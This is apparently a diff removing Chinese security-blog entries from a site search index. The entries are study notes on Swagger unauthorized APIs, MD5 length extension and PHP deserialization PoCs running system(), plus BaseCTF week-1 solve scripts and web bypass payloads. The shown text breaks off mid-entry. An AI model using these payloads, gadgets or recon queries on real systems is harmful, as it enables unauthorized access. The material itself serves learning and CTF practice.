@@ -1,390 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>swagger-未授权api</title>
-    <url>/2024/10/19/src/swagger-%E6%8E%A2%E7%B4%A2%E6%9C%AA%E6%8E%88%E6%9D%83/swagger-%E6%8E%A2%E7%B4%A2%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
-    <content><![CDATA[<p>在挖src（挖了个p），我复盘了一下让学长看，学长认为我不够深入，要对看到的每个组件进行深入学习，看看有哪些洞留个印象，以后挖洞容易看出来，也会快很多</p>
-<p>所以，这篇漏洞记录会写下针对某组件的信息搜集方式和利用方式<br><del>顺便挖个公益</del></p>
-<span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hunter app.name=&quot;Spring Whitelabel Error&quot;</span><br><span class="line">fofa app=&quot;Swagger&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a>一、漏洞原理</h1><p>Swagger 是一个开源的API 设计和文档工具，它可以帮助开发人员更快、更简单地设计、构建、文档化和测试RESTful API</p>
-<p>当swagger的页面不受保护的展示，就泄漏了api<br>而API中的一部分功能重要却不受保护，产生了未授权</p>
-<p>根据对应人员的具体api设计，针对性的利用能产生较大危害</p>
-<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>swagger基于spring-boot，所以要找到所有spring-boot站点<br>要根据站点找swagger的常见网页<br>读取swagger文档的内容测试api</p>
-<p>工具：</p>
-<ol>
-<li>快速发现swagger网页，或spring-boot其他接口</li>
-<li>快速获取可用接口 <a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a></li>
-</ol>
-<h1 id="三、信息结果"><a href="#三、信息结果" class="headerlink" title="三、信息结果"></a>三、信息结果</h1><p>我们得到了大量的api和对应的简单测试结果<br>结果分：</p>
-<ol>
-<li>token Error</li>
-<li>其他</li>
-</ol>
-<p>2就是未授权，处理2时要看对应的api文档尝试利用</p>
-<h1 id="四、API利用"><a href="#四、API利用" class="headerlink" title="四、API利用"></a>四、API利用</h1><p>接口怎么用已经写在文档里的，但是这是给程序员看的</p>
-<p>未完待续</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/15153">https://xz.aliyun.com/t/15153</a> </p>
-]]></content>
-      <categories>
-        <category>src</category>
-      </categories>
-      <tags>
-        <tag>笔记 - 漏洞记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>md5-extension-attack</title>
-    <url>/2024/09/10/md5-extension-attack/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<p>请看如下网页源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// $random = random();</span><br><span class="line"></span><br><span class="line">echo md5($random);</span><br><span class="line">$extension=$_POST[&#x27;extension&#x27;];</span><br><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line"></span><br><span class="line">if (md5($random . $extension) !== $md5) &#123;</span><br><span class="line">    echo &quot;被打穿了呜呜&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>如何使以上的条件判断成立?<br>明白这个问题需要知道md5这个算法的结构</p>
-<h1 id="Merkle-Damgard结构"><a href="#Merkle-Damgard结构" class="headerlink" title="Merkle-Damgård结构"></a>Merkle-Damgård结构</h1><p>该结构,会将输入的数据进行填充并分割成压缩函数f能处理的长度,然后处理分割后的数据<br>hash的计算方式如下<br><img src="/2024/09/10/md5-extension-attack/1.png" alt="wiki上截的"><br>一开始的压缩函数以一个固定的向量和第一个分组数据为输入<br>产生的结果为下一次压缩函数调用需要的向量,与下一组数据同时作为输入进行计算</p>
-<h1 id="通过长度拓展劫持加密过程"><a href="#通过长度拓展劫持加密过程" class="headerlink" title="通过长度拓展劫持加密过程"></a>通过长度拓展劫持加密过程</h1><p>一个hash的输入必须被填充为512bits的倍数+448bits<br>即 输入的长度(单位bit)和448关于512同模</p>
-<p>再次回顾上面的代码<br>random的md5实际上是填充后的结果<br>如果将md5和extension作为输入,再算一次,就能得到random+padding+extension的md5值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line"></span><br><span class="line">if (md5($random . $extension) !== $md5)</span><br></pre></td></tr></table></figure>
-<p>代码的这一部分<br>只要构造extension&#x3D;padding+extension,就能控制靶机网页的md5计算过程,使其计算出计划中的新md5值</p>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><blockquote>
-<p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
-</blockquote>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
-<p><a href="https://luoingly.top/post/md5-length-extension-attack/">https://luoingly.top/post/md5-length-extension-attack/</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>crypto</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>serialize_private_and_protected</title>
-    <url>/2024/09/01/serialize-private-and-protected/</url>
-    <content><![CDATA[<p>php反序列化如何同时处理private和protected类型的变量</p>
-<span id="more"></span>
-
-<h1 id="public"><a href="#public" class="headerlink" title="public"></a>public</h1><p>通常遇到的反序列化里所有类的成员都是public</p>
-<p>例:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    public $command;</span><br><span class="line"></span><br><span class="line">    function vuln($payload) &#123;</span><br><span class="line">        system($payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;vuln($this-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;command = &#x27;echo &quot;test&quot;&#x27;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这是一个非常简单的poc案例,假如实例的反序列化代码的成员类型是private或protected,这个代码就会失效</p>
-<h1 id="private"><a href="#private" class="headerlink" title="private"></a>private</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    private $command = &#x27;echo &quot;test&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    function vuln($payload) &#123;</span><br><span class="line">        system($payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;vuln($this-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>比较</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public代码的结果:</span><br><span class="line">O:4:&quot;Test&quot;:1:&#123;s:7:&quot;command&quot;;s:11:&quot;echo &quot;test&quot;&quot;;&#125;</span><br><span class="line">O%3A4%3A%22Test%22%3A1%3A%7Bs%3A7%3A%22command%22%3Bs%3A11%3A%22echo+%22test%22%22%3B%7Dtest</span><br><span class="line"></span><br><span class="line">private代码的结果:</span><br><span class="line">O:4:&quot;Test&quot;:1:&#123;s:13:&quot;Testcommand&quot;;s:11:&quot;echo &quot;test&quot;&quot;;&#125;</span><br><span class="line">O%3A4%3A%22Test%22%3A1%3A%7Bs%3A13%3A%22%00Test%00command%22%3Bs%3A11%3A%22echo+%22test%22%22%3B%7Dtest</span><br></pre></td></tr></table></figure>
-
-<p>一眼能看到,这两串序列的区别是command成员的变量名以什么形式序列化,通过观察url编码可以看出:</p>
-<ol>
-<li>public变量以command来序列化</li>
-<li>private变量以%00Test%00command的形式序列化</li>
-</ol>
-<h1 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h1><blockquote>
-<p>基本同上<br>3. protected变量以%00*%00command的形式序列化</p>
-</blockquote>
-<h1 id="遇到的问题和通解"><a href="#遇到的问题和通解" class="headerlink" title="遇到的问题和通解"></a>遇到的问题和通解</h1><p>成员类型决定我们能修改变量值的方式<br>可以通过</p>
-<ol>
-<li>$a-&gt;command &#x3D; ‘echo “test”‘;</li>
-<li>private $command &#x3D; ‘echo “test”‘;<br>的方式修改</li>
-</ol>
-<p>但如果一个类要在统一用多次,而其成员的类型是private且要赋不同的值<br>那么可以在poc里写专门的成员函数来更改成员变量的值:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    private $command;</span><br><span class="line"></span><br><span class="line">    function vuln($payload) &#123;</span><br><span class="line">        system($payload);</span><br><span class="line">    &#125;</span><br><span class="line">    function setCommand($payload)&#123;</span><br><span class="line">        $this-&gt;command=$payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;vuln($this-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;setCommand(&quot;echo &#x27;test&#x27;&quot;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>参考</p>
-<blockquote>
-<p><a href="https://xz.aliyun.com/t/6454?time__1311=n4+xnD0Dg70=G=oeGN3ExmxWuxGwSgx+7+iD#toc-1">https://xz.aliyun.com/t/6454?time__1311=n4%2BxnD0Dg70%3DG%3DoeGN3ExmxWuxGwSgx%2B7%2BiD#toc-1</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>basectf_week1_wp</title>
-    <url>/2024/08/18/basectf-week1-wp/</url>
-    <content><![CDATA[<p>misc部分基本都空着,如果也想要wp,请问<a href="https://maonie.top/">https://maonie.top/</a><br>basectf官网:basectf.fun<br>这是week1的wp</p>
-<span id="more"></span>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h2><h2 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h2><h2 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h2><h2 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a><strong>[Week1] 正着看还是反着看呢？</strong></h2><h2 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h2><h2 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h2><p>总之就是一个条件一个条件的掰flag<br>最后better个be部分没提示了,但是有hash爆破<br>BaseCTF{s1Mpl3_1s_??Tt3r_Th4n_C0mPl3x}<br>我不记得是猜Be还是用下面的exp爆的,这题做的我昏过去了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">import itertools  </span><br><span class="line">  </span><br><span class="line"># 给定的flag模板和哈希值  </span><br><span class="line">flag_template = &#x27;BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;&#x27;  </span><br><span class="line">target_hash = &#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;  </span><br><span class="line">  </span><br><span class="line"># 可能的字符集（这里假设是小写字母和数字）  </span><br><span class="line">charset = &#x27;QAZWSXEDCRFVTGBYHNUJMIKLOPabcdefghijklmnopqrstuvwxyz0123456789&#x27;  </span><br><span class="line">  </span><br><span class="line"># 遍历所有可能的两个字符组合  </span><br><span class="line">for chars in itertools.product(charset, charset):  </span><br><span class="line">    # 生成当前尝试的flag  </span><br><span class="line">    current_flag = flag_template.replace(&#x27;??&#x27;, &#x27;&#x27;.join(chars))  </span><br><span class="line">    # 计算当前flag的SHA-1哈希值  </span><br><span class="line">    current_hash = hashlib.sha1(current_flag.encode()).hexdigest()  </span><br><span class="line">    # 检查哈希值是否匹配  </span><br><span class="line">    print(current_hash)</span><br><span class="line">    if current_hash == target_hash:  </span><br><span class="line">        print(f&quot;找到匹配的flag: &#123;current_flag&#125;&quot;)  </span><br><span class="line">        break  # 找到匹配项后退出循环  </span><br><span class="line">else:  </span><br><span class="line">    print(&quot;没有找到匹配的flag&quot;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h2><h2 id="Week1-倒计时？海报！（包括公开版和公开前）"><a href="#Week1-倒计时？海报！（包括公开版和公开前）" class="headerlink" title="[Week1] 倒计时？海报！（包括公开版和公开前）"></a>[Week1] 倒计时？海报！（包括公开版和公开前）</h2><h2 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a><strong>[Week1] 签到！DK 盾！</strong></h2><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-ez-rsa"><a href="#Week1-ez-rsa" class="headerlink" title="[Week1] ez_rsa"></a>[Week1] ez_rsa</h2><p>题目给了n e c 还有not_phi&#x3D;(p+2)<em>(q+2)&#x3D;p<code>*</code>q+2p+2q+4<br>要算出私钥d就要算出n的欧拉函数<br>n的欧拉函数是(p-1)</em>(q-1)&#x3D;p<code>*</code>q-p-q+1</p>
-<p>n &#x3D; p<code>*</code>q<br>所以这是初中生就能解决的因式问题</p>
-<p>n的欧拉函数 &#x3D; (not_phi-n-4)&#x2F;&#x2F;2</p>
-<p>得到欧拉函数就可以用模逆元算d</p>
-<p>有c d n就有明文</p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from sympy import mod_inverse  </span><br><span class="line"></span><br><span class="line">e=65537</span><br><span class="line">c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br><span class="line">not_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br><span class="line">n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br><span class="line"></span><br><span class="line">pplusq=(not_phi-n-4)//2</span><br><span class="line">phi=n+1-pplusq</span><br><span class="line">d = mod_inverse(e, phi)</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Week1-babypack"><a href="#Week1-babypack" class="headerlink" title="[Week1] babypack"></a>[Week1] babypack</h2><p>加密脚本的过程大概是</p>
-<ol>
-<li>把flag转换为2进制</li>
-<li>创建一个随机数列表a,可以观察到每个随机数必然是后一个的两倍多一点</li>
-<li>然后看flag的2进制中的每一位是不是1,如果是则将随机数列表里对应数加到变量c上</li>
-</ol>
-<p>我们有的是a和c<br>那么就可以让a[i]和c比大小,判断第i+1位是不是1</p>
-<p>总之exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># a = ···</span><br><span class="line"># c = ···</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">    if c&gt;i:</span><br><span class="line">        c-=i</span><br><span class="line">        print(1,end=&#x27;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(0,end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">flag=0b10000100110000101110011011001010100001101010100010001100111101100110010011000110011010001100010001100000110001100110001001101010010110100110011011000100110010101100101001011010011010001100101001101000110000100101101011000100110010100110110011001010010110100110000011001100011001000110001011001010011010000110100011000100110010000110100011000110011100101111100</span><br><span class="line">print(libnum.n2s(flag))</span><br></pre></td></tr></table></figure>
-
-<h2 id="Week1-babyrsa"><a href="#Week1-babyrsa" class="headerlink" title="[Week1] babyrsa"></a>[Week1] babyrsa</h2><p>rsa算法,但是没有p和q,直接取n<br>我猜n大概率是素数,所以直接算它的欧拉函数</p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import libnum</span><br><span class="line">from sympy import mod_inverse  </span><br><span class="line"></span><br><span class="line">n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br><span class="line">e = 65537</span><br><span class="line">c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><span class="line">phi = n-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = mod_inverse(e, phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="Week1-十七倍"><a href="#Week1-十七倍" class="headerlink" title="[Week1] 十七倍"></a><strong>[Week1] 十七倍</strong></h2><p>明文m转秘文c的算式为<br>m*17%256&#x3D;c</p>
-<p>那么 m&#x3D;c*17关于256的模逆元%256<br>可以很容易的知道是241</p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher = [</span><br><span class="line">         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,</span><br><span class="line">        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,</span><br><span class="line">         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,</span><br><span class="line">        180, 113, 146, 148, 163,  79,  78,  48, 231,  77</span><br><span class="line">] </span><br><span class="line"></span><br><span class="line">for int in cipher:</span><br><span class="line">    print(chr(int),end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">print()</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">    cipher[i] = (cipher[i]*241) % 256</span><br><span class="line"></span><br><span class="line">for int in cipher:</span><br><span class="line">    print(chr(int),end=&#x27;&#x27;)</span><br><span class="line">  </span><br><span class="line"># 或者，如果你不想使用预定义的逆元  </span><br><span class="line"># x = solve_modular_equation(y, multiplier=17, modulus=256)  </span><br><span class="line"># print(f&quot;x = &#123;x&#125;&quot;)  # 同样应该输出 x = 148</span><br></pre></td></tr></table></figure>
-<h2 id="Week1-helloCrypto"><a href="#Week1-helloCrypto" class="headerlink" title="[Week1] helloCrypto"></a><strong>[Week1] helloCrypto</strong></h2><p>很简单的一道<br>aes是对称加密,即然key给了就能直接解</p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line">import random</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">key = libnum.n2s(208797759953288399620324890930572736628)</span><br><span class="line">my_aes=AES.new(key=key,mode=AES.MODE_ECB)</span><br><span class="line">c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><span class="line"></span><br><span class="line">decrypted_padded = my_aes.decrypt(c)  </span><br><span class="line"></span><br><span class="line">print(decrypted_padded)</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Week1-你会算md5吗"><a href="#Week1-你会算md5吗" class="headerlink" title="[Week1] 你会算md5吗"></a><strong>[Week1] 你会算md5吗</strong></h2><p>题目的加密过程,是将flag里的每一个字符都单独拎出来算一遍md5<br>那么只要把ascii表上的字符都算一遍做成字典,然后和密文撞就行了</p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">import string  </span><br><span class="line">  </span><br><span class="line">def build_md5_dict():  </span><br><span class="line">    md5_dict = &#123;&#125;  </span><br><span class="line">    characters = string.ascii_letters + string.digits + string.punctuation  </span><br><span class="line">    for char in characters:  </span><br><span class="line">        md5_hash = hashlib.md5(char.encode()).hexdigest()  </span><br><span class="line">        md5_dict[md5_hash] = char  </span><br><span class="line">    return md5_dict  </span><br><span class="line">  </span><br><span class="line"># 构建并打印MD5字典（注意：这里只打印了一部分以节省空间）  </span><br><span class="line">md5_dict = build_md5_dict()  </span><br><span class="line">  </span><br><span class="line"># 注意：由于MD5的哈希冲突可能性极低（但不为0），我们假设在这个小字符集中没有冲突。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recover_string_from_md5_list(md5_list, md5_dict):  </span><br><span class="line">    recovered_string = &quot;&quot;  </span><br><span class="line">    for md5_hash in md5_list:  </span><br><span class="line">        if md5_hash in md5_dict:  </span><br><span class="line">            recovered_string += md5_dict[md5_hash]  </span><br><span class="line">        else:  </span><br><span class="line">            # 如果MD5列表中包含未知的MD5值，可以选择跳过或抛出异常  </span><br><span class="line">            recovered_string += &quot;?&quot;  </span><br><span class="line">    return recovered_string  </span><br><span class="line">  </span><br><span class="line"># 示例MD5列表  </span><br><span class="line">md5_list = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"># 使用步骤1中生成的md5_dict来恢复字符串  </span><br><span class="line">recovered_string = recover_string_from_md5_list(md5_list, md5_dict)  </span><br><span class="line">print(recovered_string)</span><br></pre></td></tr></table></figure>
-
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a><strong>[Week1] HTTP 是什么呀</strong></h2><p>满足题目所有要求<br><img src="/2024/08/18/basectf-week1-wp/web_1_1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_1_2.png" alt="text"> </p>
-<p>就能在网络包里发现flag<br><img src="/2024/08/18/basectf-week1-wp/web_1_3.png" alt="text"> </p>
-<h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h2><p>easy<br><img src="/2024/08/18/basectf-week1-wp/web_2.png" alt="alt text"></p>
-<h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><p>md5函数不能接受数组<br>会返回false<br>弱比较和强比较都能绕<br><img src="/2024/08/18/basectf-week1-wp/web_3.png" alt="alt text"></p>
-<h2 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a><strong>[Week1] A Dark Room</strong></h2><p>我也玩过<br>flag在注释里<br><img src="/2024/08/18/basectf-week1-wp/web_4.png" alt="alt text"></p>
-<h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>直接传马上去就行了<br><img src="/2024/08/18/basectf-week1-wp/web_5_1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_5_2.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_5_3.png" alt="text"></p>
-<h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><p>pen检查用伪协议data%3A%2F%2Ftext%2Fplain%3Bbase64%2CQXVyYQ%3D%3D过<br>challenge难点</p>
-<ol>
-<li>需要以<a href="http://jasmineaura.github.io开头/">http://jasmineaura.github.io开头</a></li>
-<li>需要让访问到的内容包含已经收到Kengwang的礼物啦</li>
-</ol>
-<p>而这个网页指向的博客,在题目开始的时候,有一篇文章却是包含了已经收到Kengwang的礼物啦<br>但后来被删了,我没来得及蹭到<br>所以通过url的奇妙结构<br><a href="http://jasmineaura.github.io@truthleader.github.io/">http://jasmineaura.github.io@truthleader.github.io</a></p>
-<p>@后面的才会被当作域名解析<br>然后用gift直接包含得不到flag,所以用任意文件读取的伪协议<br><img src="/2024/08/18/basectf-week1-wp/web_6_1.png" alt="alt text"> </p>
-<p>base64解密<br><img src="/2024/08/18/basectf-week1-wp/web_6_2.png" alt="alt text"></p>
-<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a><strong>[Week1] 签个到吧</strong></h2><p>nc challenge.basectf.fun 32200<br>cat &#x2F;flag直接有</p>
-<p><img src="/2024/08/18/basectf-week1-wp/pwn_qiandao.png"></p>
-<h2 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a><strong>[Week1] echo</strong></h2><p>用echo打印flag<br><img src="/2024/08/18/basectf-week1-wp/pwn_echo.png"></p>
-<h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a><strong>[Week1] Ret2text</strong></h2><p>可以看到shell的地址<br><img src="/2024/08/18/basectf-week1-wp/pwn_ret2text1.png" alt="alt text"><br>而字符串大小为32<br><img src="/2024/08/18/basectf-week1-wp/pwn_ret2text2.png" alt="alt text"></p>
-<p>也就是32+8位数据填充实现栈溢出,然后用shell地址覆盖ret地址<br>exp如下</p>
